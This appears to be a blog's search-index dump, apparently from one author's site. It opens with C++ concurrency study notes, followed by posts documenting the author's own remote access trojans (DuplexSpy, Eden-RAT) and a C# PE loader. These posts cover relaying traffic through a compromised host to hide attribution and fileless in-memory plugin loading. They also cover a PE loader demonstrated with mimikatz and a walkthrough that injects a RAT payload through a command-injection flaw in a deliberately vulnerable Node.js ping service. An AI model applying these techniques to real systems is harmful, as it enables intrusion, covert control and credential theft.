t.join();&#125;\n2.2 - Passing arguments to a thread functionvoid f(int i, std::string const&amp; s);std::thread t(f, 3, &quot;hello&quot;);\nNote that even though f takes a std::string as the second parameter, the string literal is passwd as a char const* and converted to a std::string only in the context of the new thread. This is particularly important when the argument supplied is a pointer to an automatic variable, as follows:void f(int i, std::string const&amp; s);void oops(int some_param)&#123;    char buffer[1024];    sprintf(buffer, &quot;%i%, some_param);    std::thread t(f, 3, buffer);    t.detach();&#125;In this case, it’s the pointer to the local variable buffer that’s passed through to the new thread and there’s a significant chance that the oops function will exit before the buffer has been converted to a std::string on the new thread, thus leading to undefined behavior. This solution is to cast to std::string before passing the buffer to the std::thread constructor:void f(int i, std::string const&amp; s);void oops(int some_param)&#123;    char buffer[1024];    sprintf(buffer, &quot;%i%, some_param);    std::thread t(f, 3, std::string(buffer));    t.detach();&#125;\n2.3 - Transferring ownership of a threadvoid some_function();void some_other_function();std::thread t1(some_function);std::thread t2 = std::move(t1);t1 = std::thread(some_other_function);std::thread t3;t3 = std::move(t2);t1 = std::move(t3); //This assignment will terminate the program!\nFirst, a new thread is started and associated with t1. Ownership is then transferred over to t2 when t2 is constructed, by invoking std::move() to explicitly move ownership. At this point, t1 no longer has an associated thread of execution; the thread running some_function is now associated with t2.\nThe final move tansfers ownership of the thread running some_function back to t1 where it started. But in this case t1 already had an associated thread (which was running some_other_function), so std::terminate() is called to terminated the program.\nYou cannot just drop a thread by assigning a new value to the std::thread object that manages it.\n\nstd::thread f()&#123;    void some_function();    return std::thread(some_function);&#125;std::thread g()&#123;    void some_other_function(int);    std::thread t(some_other_function, 42);    return t;&#125;\nLikewise, if ownership should be transferred into a function, it can accept an instance of std::thread by value as one of the parameters, as shown here:void f(std::thread t);void g()&#123;    void some_function();    f(std::thread(some_function));    std::thread t(some_function);    f(std::move(t));&#125;\nclass scoped_thread&#123;    std::thread t;public:    explicit scoped_thread(std::thread t_): t(std::move(t_))    &#123;        if (!t.joinable())            throw std::logic_error(&quot;No thread&quot;);    &#125;    ~scoped_thread()    &#123;        t.join();    &#125;    scoped_thread(scoped_thread const&amp;) = delete;    scoped_thread&amp; operator=(scoped_thread const&amp;)=delete;&#125;;struct func;void f()&#123;    int some_local_state;    scoped_thread t&#123;std::thread(func(some_local_state))&#125;;    do_something_in_current_thread();&#125;void do_work(unsigned id);void f()&#123;    std::vector&lt;std::thread&gt; threads;    for (unsigned i = 0; i &lt; 20; ++i)    &#123;        threads.emplace_back(do_work, i);    &#125;    for (auto&amp; entry: threads)        entry.join();&#125;\n2.5 - Identifying threadsstd::thread::id master_thread;void some_core_part_of_algorithm()&#123;    if (std::this_thread::get_id() == master_thread)    &#123;        do_master_thread_work();    &#125;    do_common_work();&#125;\nChapter.3 - Sharing data between threadsIf you’re sharing data between threads, you need to have rules for which thread can access which bit of data when, and how any updates are communicated to the other threads that care about the data.\nIncorrect use of shared data is one of the biggest causes of concurrency-related bugs, and the consequence can be serious.\n3.1 - Problems with sharing data between threadsThe probles with sharing data between threads are all due to the consequences of modifying data. If all shared data is read-only, there’s no problem, because the data read by on thread is unaffected by whether or not another thread is reading the same data.\nOnce concept that’s widely used to help programmers reason about their code is invariants——statements that are always true about a particular data struct, such as “this variable contains” the number of items in the list.” This invariants are often broken during an update, especially if the data structure is of any complexity or the update requires modification of more than one value.\nRace conditionsIn concurrency, a race condition is anything where the outcome depends on the relative ordering of execution of operations on two or more threads; the threads race to perform their respective operations. This term is usually used to mean a problematic race condition.\nThe C++ standard also defines the term data race to mean the specific type of race condition; data races cause the dreaded undefined behavior.\nAvoiding problematic race conditionsThe simplest option is to wrap your data structure with a protection mechanism to ensure that only the thread performing a modification can see the intermediate states where the invariants are broken.\nWe can use memory model, lock-free to solve this problem.\n3.2 - Protecting shared data with mutexesMutex stands for Mutual Exclusion.\nBefore accessing a shared data structure, you lock the mutex associated with that data, and when you’ve finished accessing the data structure, you unlock the mutex.\nMutexes are the most general of the data-rpotection mechanisms available in C++, but they’re not a silver bullet; it’s important to structure your code to protect in right data and avoid race conditions inherent in your interfaces.\nMutexes also come with their own problems in the form of a deadlock and protecting either too much or too little data.\nUsing mutexes in C++#include &lt;mutex&gt;#include &lt;algorithm&gt;std::list&lt;int&gt; some_list;std::mutex some_mutex;void add_to_list(int new_value)&#123;    std::lock_guard&lt;std::mutex&gt; guard(some_mutex);    some_list.push_back(new_value);&#125;bool list_contains(int value_to_find)&#123;    std::lock_guard&lt;std::mutex&gt; guard(some_mutex);    return std::find(some_list.begin(),some_list.end(),value_to_find)    != some_list.end();&#125;\nIf one of he member functions returns a pointer or reference to the protected data, then it doesn’t matter that the member functions all lock the mutex in a nice, orderly fashion, because you’ve blown a big hole in the protection. **Any code that has access to that pointer or reference can now access (and potentially modify) the protected data without locking the mutex.\nProtecting data with mutex therefore requires careful interface design to ensure that the mutex is locked befored there’s any access to the protected data and that there are no backdoor.\nStructuring code for protecting shared dataProtecting data with mutex is not quite as easy as slapping an std::guard object in every member function; one stray pointer or reference, and all that protection is for nothing.\nAs well as checking that the member functions don’t pass out pointers or references to their callers, it’s also important to check that they don’t pass there pointers or references IN to functions they call that arent’s under you control, this is dangerous.class some_data&#123;    int a;    std::string b;public:    void do_something();&#125;;class data_wrapper&#123;private:    some_data data;    std::mutex m;public:    template&lt;typename Function&gt;    void process_data(Function func)    &#123;        std::lock_guard&lt;std::mutex&gt; l(m);        func(data);    &#125;&#125;;some_data* unprotected;void malicious_function(some_data&amp; protected_data)&#123;    unprotected=&amp;protected_data;&#125;data_wrapper x;void foo()&#123;    x.process_data(malicious_function);    upprotected-&gt;do_something();&#125;In this example, the code in process_data looks harmless enough, nicely protected with std::lock_guard, but the call to the user-supplied func function means that foo can pass in malicious_function to bypass the protection and then call do_something() without the mutex being locked.\n\nGuidline: Don’t pass pointers and references to protected data outside the scope of the lock, whether by returning them from a function, storing them in externally visible memory, or passing them as arguments to user-supplied functions.\n\nJust because you’re using a mutex or other mechanism to protect shared data, it doesn’t mean you’re protected from race conditions; you still have to ensure that the appropriate data is protected.\nConsider the doubly linked list example. If you protected access to the pointers of each node individually, you’d be no better off than with code that used no mutexes, because the race condition could still happen——it’s not the individual nodes that need protecting for the individual steps but the whole data structure, for the whole delete operation. The easiest solution in this case is to have a single mutex that protects the entire list.\nDeadlock: the problem and a solutionImagine a pair of threads arguing over locks on mutexes: each of a pair of threads needs to lock both of a pair of mutexes to perform some operation, and each thread has one mutex and is waiting for the other. Neither thread can proceed, because each is waiting for the other to release its mutex. This scenario is called deadlock, and it’s the biggest problem with having to lock two or more mutexes in order to perform an operation.\nThe common advice for avoiding deadlock is to always lock the two mutexes in the same order.\nThe C++ Standard Library has a cure for this in the form of std::lock——a function that can lock two or more mutexes at once without risk of deadlock.\nclass some_big_object;void swap(some_big_object&amp; lhs, some_big_object&amp; rhs);class X&#123;private:    some_big_object some_detail;    std::mutex m;public:    X(some_big_object const&amp; sd): some_detail(sd) &#123;&#125;    friend void swap(X&amp; lhs, X&amp; rhs)    &#123;        if (&amp;lhs==&amp;rhs)            return;        std::lock(lhs.m, rhs.m);        std::lock_guard&lt;std::mutex&gt; lock_a(lhs.m, std::adopt_lock);        std::lock_guard&lt;std::mutex&gt; lock_b(rhs.m, std::adopt_lock);        swap(lhs.some_detail, rhs.some_detail);    &#125;&#125;;\nFirst, the arguments are checked to ensure they are different instances, because attempting to acquire a lock on std::mutex when you already hold it is undefined behavior (A mutex that does permit multiple locks by the same thread is provided in the form of std::recursive_mutex.).Then, the call to std::lock() locks the two mutexes, and two std::lock_guard instances are constructed and, one for each mutex.The std::adopt_lock parameter is supplied in addition to the mutex to indicate to the std::lock_guard objects that the mutexes are already locked, and they should adopt the ownership of the existing lock on the mutex rather than attempt to lock the mutex in the constructor.\nC++17 provides additional support for this scenario, in the form of a new RAII termplate, std::scoped_lock&lt;&gt;. This is exactly equivalent to std::lock_guard&lt;&gt;, except that it is a variadic template, accepting a list of mutex types as template parameters, and a list of mutexes as constructor arguments. The mutexes supplied to the constructor are locked using the same algorithm as std::lock, so that when the constructor completes they are all locked, and they are then all unlocked in the destructor.void swap(X&amp; lhs, X&amp; rhs)&#123;    if(&amp;lhs==&amp;rhs)        return;    std::scoped_lock guard(lhs.m,rhs.m);    swap(lhs.some_detail,rhs.some_detail);&#125;This example uses another feature added with C++17: automatic deduction of class template parameters.This line is equivalent to the equivalent to the fully specified version:std::scoped_lock&lt;std::mutex, std::mutex&gt; guard(lhs.m, rhs.m);\nThe existence of std::scoped_lock means that most of the cases where you would have used std::lock prior to C++17 can now be written using std::scoped_lock, with less potential for mistakes.\nYou have to rely on your discipline as developers to ensure you don’t get get deadlock. This isn’t easy: deadlocks are one of the nastiest problems to encounter in multithreaded code and are often unpredictable, with everything working fine the majority of the time.\nFuther guidlines for avoiding deadlockDeadlock doesn’t only occur with locks. You can create deadlock with two threads and no locks by having each thread call join() on the std::thread object for the other. In this case, neither thread can make progress because it’s waiting for the other to finish.\nThe guidlines for avoiding deadlock all boil down to one idea: don’t wait for another thread if there’s a chance it’s waiting for you.\n\nAvoid nested locks:Don’t acquire a lock if you already hold one. If you stick to this guidline, it’s impossible to get a deadlock from the lock usage alone because each thread only ever holds a single lock. You should still get deadlock from other things (like the threads waiting for each other), but mutex locks are probably the most common cause of deadlock.\nAvoid calling user-suplied code while holding a lock:This is a simple follow-on from the previous guidline. Because the code is user-supplied, you have no idea what it could do; it could do anything, including acquiring a lock.\nAcquire locks in a fixed order:If you absolutely must acquire two or more locks, and you can’t acquire them as a single operation with std::lock, the next best thing is to acquire them in the same order in every thread.\nUse a lock hiearchy:Although this is a particular case of defining lock ordering, a lock hierarchy can provide a means of checking that the convention is adhered to at runtime. The idea is that you divide your application into layers and identify all the mutexes that may be locked in any given layer.\nExtending these guidlines beyond locks:Deadlocks also occur with any synchronization construct that can lead to a wait cycle.\\If you’re going to wait for a thread to finish, it might be worth identifying a thread hierarchy, so that a thread waits only for threads lower down the hierarchy. One simple way to do this is to ensure that your threads are joined in the same function that started them.\n\nFlexible locking with std::unique_lockOnce you’ve designed your code to avoid deadlock, std::lock() and std::lock_guard cover most of the cases of simle locking, but sometimes more flexibility is required.\nstd::unique_lock provides a bit more flexibility than std::lock_guard by relaxing the invariants; an std::unique_lock instance doesn’t always own the mutex that it’s associated with.\nYou can pass std::adopt_lock as a second argument to the constructor to have the lock object manage the lock on a mutex, you can also pass std::defer_lock as the second argument to indicate that the mutex should remain unlocked on construction.\nclass some_big_object;void swap(some_big_object&amp; lhs,some_big_object&amp; rhs);class X&#123;private:    some_big_object some_detail;    std::mutex m;public:    X(some_big_object const&amp; sd):some_detail(sd)&#123;&#125;    friend void swap(X&amp; lhs, X&amp; rhs)    &#123;        if (&amp;lhs == &amp;rhs)            return;        std::unique_lock&lt;std::mutex&gt; lock_a(lhs.m, std::defer_lock);        std::unique_lock&lt;std::mutex&gt; lock_b(rhs.m, std::defer_lock);        std::lock(lock_a, lock_b);        swap(lhs.some_detail, rhs.some_detail);    &#125;&#125;;\nUsing std::unique_lock and std::defer_lock, rather than std::lock_guard and std::adopt_lock.\nstd::unique_lock objects could be passed to std::lock(), because std::unique_lock provides lock(), try_lock(), and unlock() member functions.\nTransferring mutex ownership between scopesBecause std::unique_lock instances don’t have to own their associated mutexes, the ownership of mutex can be transferred between instances by moving the instances around.\nLocking at an appropriate granularityThe lock granularity is a hand-waving term to describe the amount of data protected by a single lock. A fine-grained lock protects a small amount of data, and a coarse-grained lock protects a large amount of data.\n3.3 - Alternative facilities for protecting shared dataChapter.4 - Synchronizing concurrent operationsSometimes you don’t just need to protect the data, you also need to synchronize actions on separate threads. One thread might need to wait for another thread to complete a task before the thread can complete its own, for example. In general, it’s common to want a thread to wait for a specific event to happen or a condition to be true.\n4.1 - Waiting for an event or other conditionIf one thread is waiting for a second thread to complete a task, it has several options. First, it could keep checking a flag in shared data (protected by mutex) and have the second thread set the flag when it come pletes the task. This is wasteful on two counts: the thread consumes valuable processing time repeatedly checking the flag, and when the mutex is locked by the waiting thread, it can’t be locked by any other thread.\nbool flags;std::mutex m;void wait_for_flag()&#123;    std::unique_lock&lt;std::mutex&gt; lk(m);    std::this_thread::sleep_for(std::chrono::miliseconds(100));    lk.lock();&#125;\nIn the loop, the function unlocks the mutex before the sleep, and locks it again afterward so another thread gets a chance to acquire it and set the flag.\nThis is an improvement because the thread does not waste processing time while it’s sleep, but it’s hard to get the sleep period right.\nThe third and preferred option is to use the facilities from the C++ Standard Libaray to wait for the event itself.\nWaiting for a condition with condition variablesThe Standard C++ Library provides two implementations of a condition variable: std::condition_variable and std::condition_variable_any. Both of these are declared in the &lt;condition_variable&gt; library header.\nIn both cases, they need to work with a mutex in order to provide appropriate synchronization the former is limited to working with std::mutex, whereas the latter can work with anything that meets the mimimal criteria for being mutex-like, hence the _any suffix. \nstd::condition_variable_any is more general, there’s the potential for additional consts in terms of size, performance, or OS resources, so std::condition_variable should be preferred unless the additional flexibility is required.\nstd::mutex mut;std::queue&lt;data_chunk&gt; data_queue;std::condition_variable data_cond;void data_preparation_thread()&#123;    while (more_data_to_prepare())    &#123;        data_chunk const data = prepare_data();        &#123;            std::lock_guard&lt;std::mutex&gt; lk(mut);            data_queue.push(data);        &#125;        data_cond.notify_one();    &#125;&#125;void data_processing_thread()&#123;    while (true)    &#123;        std::unique_lock&lt;std::mutex&gt; lk(mut);        data_cond.wait(            lk, []&#123;return !data_queue.empty();&#125;        );        data_chunk data = data_queue.front();        data_queue.pop();        lk.unlock();        process(data);        if (is_last_chunk(data))            break;    &#125;&#125;\n\nYou have a queue that’s used to pass the data between two therads.\nNote that you put the code to push the data onto the queue in a smaller scope, so you notify the condition variable after unlocking the mutex.\nOn the other side of the fence, you have the processing thread. This thread first locks the mutex, but this time with a std::unique_lock rather than a std::lock_guard. The reason is std::unique_lock is reusable. The waiting thread must unlock the mutex while it’s waiting and lock it again afterward, and std::lock_guard doesn’t provide that flexibility.\n\nChapter.5 - The C++ memory model and operations on atomic typesThis chapter will start by convering the basic of the memory model, then move on to the atomic types and operations, and finally cover the various types of synchronization available with the operations on atomic types.\n5.1 - Memory model basicObjects and memory locationsThe C++ Standard defines an object as “a region of storage”, although it goes on to assign properties to these objects, such as their type and lifetime.\nWhatever its type, an object is stored in one or more memory locations. Each memory location is either an object (or sub-object) of a scalar type such as unsigned short or my_class* or a sequence of adjacent bit fields. If you use bit fields, this is an important point to note: though adjacent bit fields are distinct objects, they’re still counted as the same memory location.\n\n\n\nThere are four important things to take away from this:\n\nEvery variable is an object, including those that are members of other objects.\nEvery object occupies at least one memory location.\nVariables of fundamental types such as int or char occupy exactly one memory location, whatever their size, even if they’re adjacent or part of an array.\nAdjacent bit fields are part of the same memory location.\n\nObjects, memory locations and concurrencyIf two threads access separate memory locations, there’s no problem: everything works fine. On the other hand, if two threads access the same memory location, then you have to be careful.\\If neither thread is updating the memory location, you’re fine; read-only data does not need protection or synchronization.If either thread is modifying the data, there’s a potential for a race condition.\nSolutions:\n\nmutexes.\nSynchronization properties of atomic operations.\n\nIf two threads access the same memory location, each pair of accesses must have a defined ordering.\nIf there’s no enofrced ordering between two accesses to a single memory location from separate threads, one or both of those accesses is no atomic, and if one or both is a write, then this is a data race and causes undefined behavior.\nModification ordersIf you do use atomic operations, the compiler is responsible for ensuring that the necessary synchronization is in place.\\This requirement means that certain kinds of speculative execution ain’t permitted, because once a thread has seen a particular entry in the modification order, subsequent reads from that thread must return laster values, and subsequent writes from that thread to that object must occur laster in the modification order.\n5.2 - Atomic operations and types in C++An atomic operation is an indivisible operation. You can’t observe such an operation half-done from any thread in the system; it’s either done or not done.\nIf the load operation that reads the value of an object is atomic, and all modifications to that object are also atomic.\nThe flip side of this is that a non-atomic operation might be seen as half-done by another thread. If the non-atomic operation is composed of atomic operaitons (for example, assignment to struct with atomic members), then other threads may observe some sbuset of the constituent atomic operation as complete, but others as not yet started, so you might observe or end up with a value that is a mixed-up combinationof the various values stored.\nThe standard atomic typesThe standard atomic types can be found in the &lt;atomic&gt; header. All operations on such types are atomic, and only operations on these types are atomic in the sense of the language definition, although you can use mutexes to make other operation appear atomic.\nThis is important to know in many cases——the key use case for atomic operations is as a replacement for an operation that would otherwise use a mutex for synchronization.\nThe library provides a set of macros to identify at compile time whether the atomic types for the various integral types are lock-free.\nSince C++17, all atomic types have a static constexpr member variable, X::is_always_lock_free, which is true if and only if the atomic type X is lock-free for all supported hardware that the output of the current compilation might run on.\nChapter.6 - Designing lock-based concurrent data structuresChapter.7 - Designing lock-free concurrent data structures.Chapter.8 - Designing concurrent codeChapter.10 - Advanced thread management","categories":["Book"],"tags":["Book","Learning","Study","Note","Programming","C++","Coding","Concurrency"]},{"title":"[DuplexSpy] SOCKS5 Proxy","url":"/2026/02/03/2026-2-3-DuplexSpyProxy/","content":"IntroductionThis article demonstrates how to use the proxy feature of DuplexSpy.\nThis feature allows you to use a compromised machine as a proxy, meaning that all network traffic from your machine can be forwarded through the compromised host. \nEven if a compromised machine does not store sensitive data, it can still be abused as a proxy or relay node for malicious activities, such as forwarding SSH sessions. This allows threat actors to hide their real origin and reduce the risk of attribution.\n\n\n\nPrincipleA C2 server starts listening on one or more ports and accepts SOCKS5 connections from proxy users. The C2 server redirects the user’s network stream to a compromised machine, which then forwards the traffic to the target host. All DNS resolution is performed on the compromised machine.\n\n\n\nUsageIn this example, I demonstrates the proxy feature through SSH and proxychains.  The following table describes the experimental environment:\n\n\n\n\nHost\nOS\nDescription\n\n\n\n\n10.98.225.138\nUbuntu VM\nTarget host. It has enabled SSH service. An important file is stored at ~/Desktop/foo.txt.\n\n\n10.98.222.136\nWindows 10 x64\nCompromised machine.\n\n\n10.98.241.11\nDebian Kali Linux\nAttacker machine.\n\n\n10.98.253.150\nWindows 10\nAttacker’s C2 server.\n\n\n\n\nStart the DuplexSpy C2 server:\n\n\n\n\n    \n    Right click the compromised host and select Proxy\n    \n\n\n\n\n\n\n    \n    You should use an unused port.\n    \n\n\nNext, establish an SSH connection from Kali Linux to the target host 10.98.225.138.\nConfigure the proxychains:$ vim /etc/proxychains.conf\n\n\n\n$ proxychains ssh sdksdk@10.98.225.138\n\n\n\n\n\n\nNow, check the source IP address on the target host:netstat -ano | grep &quot;:22&quot;\n\n\n\nThe source address is 10.98.222.136:54372, which belongs to the compromised machine.\nTHANKS FOR READING!\n","categories":["Tools/DuplexSpy"],"tags":["DuplexSpy","RAT","Tools","SOCKS5","Proxy"]},{"title":"[Eden-RAT] How to Use Eden-RAT During the Early Stage of Penetration Testing","url":"/2026/02/09/2026-2-9-EdenPentestInitialStage/","content":"IntroductionThis article shows how to use Eden-RAT in the early stage of penetration testing.\nGithub Repository: https://github.com/iss4cf0ng/Eden-RAT/\n\n\n\nDisclaimerThis project was developed out of personal interest in cybersecurity research and education.It must not be used for illegal or unauthorized activities.The author is not responsible for any misuse or damage caused by this software.\nGetting StartedEnvironmentThe following table describes the experimental environment:\n\n\n\n\nHost\nOS\nDescription\n\n\n\n\n172.23.243.133\nWSL\nEden-Server (C2 server)\n\n\n192.168.1.131:3000\nUbuntu x64\nLinux server with an RCE vulnerability\n\n\n192.168.1.125\nWindows 10\nEden-Client\n\n\n\n\nVulnerable MachineIn this demonstration, I deployed an Linux server with a simple RCE vulnerability. The server runs a Node.js web service.\nBelow is the Node.js code that contains the RCE vulnerability://app.jsconst express = require(&quot;express&quot;);const &#123; exec &#125; = require(&quot;child_process&quot;);const app = express();const PORT = 3000;app.get(&quot;/ping&quot;, (req, res) =&gt; &#123;  const host = req.query.host;  if (!host) &#123;    return res.send(`      &lt;h2&gt;Ping a host&lt;/h2&gt;      &lt;form&gt;        &lt;input name=&quot;host&quot; placeholder=&quot;Enter host&quot; /&gt;        &lt;button type=&quot;submit&quot;&gt;Ping&lt;/button&gt;      &lt;/form&gt;    `);  &#125;  exec(`ping -c 1 $&#123;host&#125;`, (error, stdout, stderr) =&gt; &#123;    if (error) &#123;      return res.send(`&lt;pre&gt;$&#123;stderr&#125;&lt;/pre&gt;`);    &#125;    res.send(`&lt;pre&gt;$&#123;stdout&#125;&lt;/pre&gt;`);  &#125;);&#125;);app.listen(PORT, () =&gt; &#123;  console.log(`Server running at http://localhost:$&#123;PORT&#125;`);&#125;);\n\n\n\nThis web application provides a ping feature used to test network connectivity or resolve domain names.The nutshell of this feature is executing a Linux command. An RCE vulnerability can occur if a malicious user appends a semicolon (;) followed by arbitrary Linux commands to the host parameter:\n\n\n\nAgain, this is a very simple demonstration of RCE vulnerability. In real-world scenarios, RCE vulnerabilities are not always straightforward——just as buffer overflows in operating systems are often more complex. However, for educational purpose, simple is the best!\nNow, let’s try to exploit this vulnerability using Eden-RAT.\nDeploy Eden C2 ServerIf you want to know how to deploy your Eden-Server and Eden-Client, please click here.\nGenerate a payloadBoth the encryption and decryption mechanisms are implemented natively (pure implementation).This means the target platform does not require any third-party libraries.\n\n\n\nIf the payload is generated successfully, Eden-RAT will display the raw payload code,Next, switch the combo box selection to Command, then click Copy:\n\n\n\nBefore exploitation, don’t forget to URL-encode the payload!\n\n\n\nNow, let’s proceed with the RCE exploitation:/ping?host=github.com;python3%20-c%20............(Your payload)\nOnce the target Linux machine is online, we can execute interactive commands through the virtual terminal:\n\n\n\n\n\n\nTHANKS FOR READING!\n","categories":["Tools/Eden-RAT"],"tags":["Penetration","Pentesting","Tools","Eden-RAT"]},{"title":"[DuplexSpy] Using and Developing a Plugin.","url":"/2026/02/03/2026-2-3-DuplexSpyPlugin/","content":"IntroductionDuplexSpy provides a simple remote plugin manager that allows you to load customized plugins into a compromised machine without writing them to disk.\nThis article describes how to use and develop a custom plugin for DuplexSpy.\nNote that all plugins are implemented using .NET Framework 4.8 for compatibility reasons.\nThe plugin manager interface provides a GUI ListView and a console.\n\n\n\nPrincipleThe C2 server sends the raw DLL bytes of plugin assemblies to the compromised machine. The payload loads these assemblies into memory using the Assembly.Load() method and stores their interfaces in a read-only dictionary. The payload can invoke plugin interfaces and pass parameters whenever it receives commands from the C2 server.\nWhen the payload is terminated, all loaded plugins are automatically released by the system.\nUsageThe plugin console provides the following commands:\n\n  \n    \n      Command\n      Description\n    \n  \n  \n    \n      clear\n      Clear the console output.\n    \n    \n      show\n      List all available plugins under the plugin folder.\n    \n    \n      loaded\n      Show all currently loaded plugins.\n    \n    \n      load &lt;all | plugin name&gt;\n      Load specified plugin.\n    \n    \n      unload &lt;all | plugin name&gt;\n      Unload the specified plugin.\n    \n    \n      &lt;entry&gt; &lt;param1&gt; &lt;param2&gt; ...\n      Use specified plugin with parameters.\n    \n  \n\n\n\n\n\n\nExample 1 - Coffeecoffee help\n\n\n\ncoffee print=1\n\n\n\nNote that the Plugin Manager throws an exception if an unhandled exception occurs inside a plugin and displays the corresponding error message. However, the payload itself will not be terminated.\nExample 2 - Dumper\n\n\n\n\n\nExample 3 - InfoSpyder\n\n\nDevelopmentTo develop a plugin. Firstly, create a new .NET framework 4.8 library project.\n\n\n\n\n    \n    Any name that you like. This name is regardless for the final result.\n    \n\n\nAdd a reference Plugin.Abstractions48:\n\n    \n    Right click your project -> Add -> Reference\n    \n\n\n\n    \n    Plugin.Abstractions48\n    \n\n\nDon’t forget to use it in your project.\n\n\n\nAdd the required attributes and properties. The HelpTable is optional but recommended. The Name field must be a unique identifier for the plugin.\n\n\n\nAdd the required functions:\n\n\n\nAt this point, you have successfully developed a custom plugin. Before building the project, install Costura.Fody to ensure that all dependencies are merged into a single DLL, even if no additional NuGet packages are used.\n\n\n\n\n\n\nBuild the DLL file:\n\n    \n    Right click your project -> Build\n    \n\n\nMove the generated DLL into the .\\Plugins folder of DuplexSpy and create a JSON file WITH THE SAME FILE NAME (important).\n\n\n\nThe JSON file should be structured as follows. The Name field must match the plugin name defined in the code. The Entry field specifies the command name used in the plugin console. The Command field is reserved for future use.\n\n\n\nGo to DuplexSpy. Open Plugin:\n\n\n\nOur HelloWorld plugin has been successfully installed. Now let’s try it in the console:\n\n\n\n\n\n\nCongratulations! You have successfully developed and deployed a custom Duplex plugin.\nTHANKS FOR READING!\n","categories":["Tools/DuplexSpy"],"tags":["C#","DuplexSpy","RAT","Document","Remote Plugin",".NET"]},{"title":"[Tools] dotNetPELoader——A C# PE loader for x64 and x86 PE files.","url":"/2026/02/06/2026-2-6-ToolDotNetPELoader/","content":"IntroductionRecently, when I was developing a fileless execution method for DuplexSpy RAT version 2, I could hardly find a C#-based x86 PE loader.Most existing implementations I found were x64-only, such as the one developed by Casey Smith\n\n\n\nTherefore, I decided to develop a C#-based x86 PE loader myself.\nThis console application allows you to load either x86 or x64 PE files into memory.First, it reads the file bytes from the specified file path, then determines the architecture of both the loader and the target PE file.\nAn x64 PE cannot be loaded by an x86 loader, and vice versa.\nView the GitHub repository here  \nFeatures\nLoad x86 PE in x86 process\nLoad x64 PE in x64 process\nHandles relocation and import resolving\nFully written in C#\n\nIf you find this project useful, a ⭐ would be appreciated.\n\n\n\nUsagedotNetPELoader.exe --x64 x64_file.exedotNetPELoader.exe --x86 x86_file.exedotNetPELoader.exe --coffee\n\n\n\nDemonstrationx64 - mimikatz\n\n\nIf you try to load an x86 PE while the loader is an x64 loader, an exception will be thrown:dotNetPELoader.exe --x64 mimikatz\n\n\n\n\n\n\n\n\n\nx86 - mimikatz\n\n\ndotNetPELoader.exe --x86 mimikatz\n\n\n\n\n\n\nTHANKS FOR READING\n","categories":["Tools/dotNetPELoader"],"tags":["C#","Fileless Execution","PE Loader","PE File","x86","x64"]},{"title":"[Tool] Eden-RAT——A lightweight Remote Access Tool (RAT) designed for the initial stage of penetration testing","url":"/2026/02/09/2026-2-9-ToolEdenRAT/","content":"PrefaceWhile developing EgoDrop and DuplexSpy, I successfully implemented an interactive shell within a C#-based GUI application. I then recalled one of my earlier projects that had been suspended due to my limited development experience at the time. Therefore, I decided to revisit and complete it.\nThe idea of this project originated when I was learning web penetration testing.When discovering an RCE (Remote Code/Command Execution) vulnerability, we usually demonstrate it with simple Linux commands(e.g., id, whoami, ls, cat /etc/passwd), and that is often the end of the story. However, if we want to conduct further post-exploitation——such as pivoting into the internal network——we may rely on reverse shell tools like metasploit, nc or openssl. Although they are powerful and widely used, they still have certain limitations in practical penetration testing scenario.sTherefore, I decided to develop a GUI-based remote access tool which can be leveraged after achieving RCE, establishing a robust and secure channel with an interactive shell and file manager.\nDeveloping and maintaining this tool entirely on my own is challenging due to limited time, resources, and experience. As a result, the project may still contain undiscovered defects or design flaws. If you encounter any issues while using this tool, please feel free to open an issue or contact me.\nIf you find this tool informative or helpful, a star ⭐ will be greatly appreciated. \nIf you are interested in a demonstration of exploitation, please click here.\nIntroductionEden-RAT is a lightweight Remote Access Tool (RAT) designed for the initial stage of penetration testing.It provides a Graphical User Interface (GUI) with multiple features targeting Linux systems, including a file manager and an interactive shell.\nThe interactive shell enables full command execution, allowing users to run commands such as ssh, apt, pip install, vim, and other interactive programs seamlessly.\nGithub Repository: https://github.com/iss4cf0ng/Eden-RAT/\nFeaturesFeaturesEden (Operator)\nBuild Payload\nMulti Listener\nEncrypted Channels\n\nInfected Machine\nInformation\nFile Manager\nDisplay Image\nEdit, Copy, Move, Paste, Upload, Download, Rename, Datetime\nWGET\nArchive: Compress, Extract\nNew: Folder, Text File\n\n\nProcess View\nService View\nConnection: Disconnect, Reconnect\n\nDisclaimerThis project was developed out of personal interest in cybersecurity research and education.It must not be used for illegal or unauthorized activities.The author is not responsible for any misuse or damage caused by this software.\n\n\n\nTechnical OverviewEden-RAT supprots encrypted communication using either AES/RSA hybrid encryption or TLS.\nThe AES pure implementation is adapted from:https://github.com/bozhu/AES-Python\nOnce a payload successfully connects to the Eden server, it dynamically loads additional modules delivered by the server. These modules are executed via exec() and their class instances are registered within an internal dictionary-based class registry.\nThe overall architecture is illustrated below:\n\n\n\nGetting StartedEden-RAT consists of three components——Eden-Server, Eden-Client and the payload. \nThe overall architecture is shown as below:\n\n\n\nAll communication channels are point-to-point encrypted. The communication channel between the Eden-Server and the Eden-Client is encrypted using AES+RSA, while a channel between the Eden-Server and the target Linux server is encrypted using either AES+RSA or TLS.\nEden-ServerAn Eden-Server is a python-based socket server. It provides multiple listeners for accepting and handling socket session from Eden-Clients and target Linux servers. It forwards messages between infected Linux systems and Eden-Clients, and processes tasks such as adding listener, building payload requested by Eden-Clients. \nNote that an Eden-Server requires pycryptodome.\nAvailable argument:\n\n\n\nEden-ClientAn Eden-Client is a C2 user who performs exploitation. All the tasks can only be processed after the Eden-Client connects to an Eden-Server.\n\n\n\nPayloadA payload is a script which is used for exploitation. All cryptographic algorithms implemented in the payload are written natively. It means the target Linux server doesn’t requires any third-party libraries (such as pycryptodome), but only a compatible runtime environment (e.g., python 3.10).\nUsageInformation\n\n\nFile Manager\n\n\n\n\n\nShell\n\n\nProcess View\n\n\nService View\n\n\nDemonstrationDeploy Eden C2 ServerBefore starting the C2 server, you need to install pycryptodome:pip3 install pycryptodome\nAfter installing the package, you must generate an SSL private key and certificate::openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodesMake sure the files are named exactly:\n\nkey.pem\ncert.pem\n\nFinally, start the C2 server:python3 eden_server.py -lvvp 4444\nOur Eden-Server has been deployed.\n\n\n\nStart Eden Client and Connect to the C2 ServerThe default C2 user’s credential are:username = sdksdkpassword = 123456\n\n\n\nAfter logging in successfully, you should see the following message box:\n\n\n\nAdd/Delete a C2 Userpython3 eden_server.py --db\n\n\n\nNote that your input of password is invisible, which is expected.\nGenerate a payloadBoth the encryption and decryption mechanisms are implemented natively (pure implementation).This means the target platform does not require any third-party libraries.\n\n\n\n\nInfectionYou can run the payload script directly:python3 payload.py\nYou can also execute the payload after achieving RCE. If you are interested in a demonstration of exploitation, 